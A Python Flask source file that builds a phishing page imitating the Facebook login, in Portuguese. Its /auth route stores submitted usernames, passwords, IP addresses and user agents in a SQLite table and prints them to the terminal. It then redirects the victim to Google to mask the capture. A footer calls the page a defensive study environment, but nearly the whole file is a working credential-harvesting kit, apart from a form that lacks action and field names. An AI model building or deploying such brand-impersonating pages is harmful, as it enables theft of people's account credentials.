from datetime import datetime
import sqlite3
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

# Nome do arquivo do banco de dados SQLite local
DB_NAME = "security_audit.db"


def init_db():
  """Inicializa o banco de dados e cria a tabela de logs se não existir"""
  conn = sqlite3.connect(DB_NAME)
  cursor = conn.cursor()
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS captured_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT
        )
    """)
  conn.commit()
  conn.close()


# Template HTML/CSS do formulário de login
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Acesso - Auditoria</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        /* Contentor principal que divide a tela em 2 */
        .main-container {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 980px;
            padding: 20px;
            box-sizing: border-box;
        }

        /* Lado Esquerdo */
        .left-side {
            flex: 1;
            padding-right: 40px;
        }

        .left-side h2 {
            font-size: 28px;
            font-weight: normal;
            color: #1c1e21;
            line-height: 32px;
        }

        .login-card {
            background: white;
            padding: 24px;
            border-radius: 8px;
            box-shadow: none;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-sizing: border-box;
        }
        .login-card h2 {
            margin-bottom: 20px;
            color: #1b1c1f;
            font-size: 16px;
            text-align: left;
        }
        .input-group {
            margin-bottom: 12px;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 14px;
            box-sizing: border-box;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #494c4e;
            
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background-color: #166fe5;
        }
        .footer-warning {
            margin-top: 15px;
            font-size: 12px;
            color: #8a8d91;
        }
        .btn-forgot {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #ffffff; /* Cor de fundo cinza claro */
            color: #4b4f56; /* Cor do texto */
            text-align: center;
            text-decoration: none;
            border-radius: 50px; /* Deixa bem arredondado em formato de pílula */
            font-size: 15px;
            font-weight: bold;
            margin-top: 12px;
            box-sizing: border-box;
            transition: background-color 0.2s;
        }

        .btn-forgot:hover {
            background-color: #e4e6eb; /* Cinza um pouco mais escuro ao passar o mouse */
        }
        .btn-register {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: transparent; /* Fundo transparente */
            color: #1877f2; /* Cor do texto azul */
            text-align: center;
            text-decoration: none;
            border: 1px solid #1877f2; /* Borda azul */
            border-radius: 50px; /* Formato de pílula arredondada */
            font-size: 15px;
            font-weight: bold;
            margin-top: 12px;
            box-sizing: border-box;
            transition: background-color 0.2s;
        }
        .btn-register:hover {
            background-color: #f0f4ff; /* Azul bem clarinho ao passar o mouse */
        }
        .login-footer {
            margin-top: 24px;
            text-align: center;
        }

        .login-footer img {
            height: 16px; /* Ajuste a altura conforme o tamanho da sua logo */
            opacity: 0.7;  /* Deixa com um tom mais suave, se preferir */
        }

        .login-footer span {
            font-size: 14px;
            font-weight: bold;
            color: #000000;
        }
    </style>
</head>
<body>
<div class="main-container">
    <!-- Lado Esquerdo: Imagem ou Texto de Apresentação -->
    <div class="left-side">
        <img src="{{ url_for('static', filename='image-1.png') }}" alt="Ilustração" class="banner-img">
    </div>
    <!-- Lado Direito: O seu Formulário de Login -->
    <div class="right-side">
        <div class="login-card">
        <h2>Entrar no Facebook</h2>
        <form>
            <div class="input-group">
                <input type="text" placeholder="Email ou número de celular" required>
            </div>
            <div class="input-group">
                <input type="password" placeholder="Senha" required>
            </div>
            <button type="submit" class="btn-submit">Entrar</button>
            <a href="#" class="btn-forgot">Esqueceu a senha?</a>
            <a href="#" class="btn-register">Criar nova conta</a>
            <div class="footer-warning">
                        Ambiente isolado para estudos de segurança defensiva.
            </div>
        </form>
        <div class="login-footer">
        <img src="{{ url_for('static', filename='image-3.png') }}" alt="Ilustração" class="banner-img">
        </div>
        </div>
    </div>
    </div>
</body>
</html>
"""


@app.route("/")
def home():
  return render_template_string(LOGIN_PAGE)


@app.route("/auth", methods=["POST"])
def capture_credentials():
  # Coleta os dados da requisição
  user = request.form.get("username")
  password = request.form.get("password")
  ip_origem = request.remote_addr
  user_agent = request.headers.get("User-Agent")
  timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

  # 1. Salva os dados no Banco de Dados SQLite local
  try:
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(
        """
            INSERT INTO captured_logs (timestamp, ip_address, username, password, user_agent)
            VALUES (?, ?, ?, ?, ?)
        """,
        (timestamp, ip_origem, user, password, user_agent),
    )
    conn.commit()
    conn.close()
    salvo_db = "SUCESSO (Salvo em security_audit.db)"
  except Exception as e:
    salvo_db = f"ERRO ao salvar: {e}"

  # 2. Exibe o alerta visual destacado no terminal
  print("\n" + "🔥" * 25 + " ALERTA DE SEGURANÇA " + "🔥" * 25)
  print(f"[{timestamp}] Requisição POST interceptada com sucesso!")
  print(f" -> IP de Origem  : {ip_origem}")
  print(f" -> Usuário/Email : {user}")
  print(f" -> Senha Digitada: {password}")
  print(f" -> Status Banco  : {salvo_db}")
  print("=" * 73 + "\n")

  # Redireciona o usuário para simular o fluxo normal
  return redirect("https://www.google.com")


if __name__ == "__main__":
  # Inicializa o banco de dados antes de subir o servidor
  init_db()
  print("[*] Banco de dados SQLite inicializado com sucesso.")
  print("[*] Servidor rodando em http://127.0.0.1:8080")

  # Roda a aplicação na porta 8080
  app.run(host="0.0.0.0", port=8080, debug=True)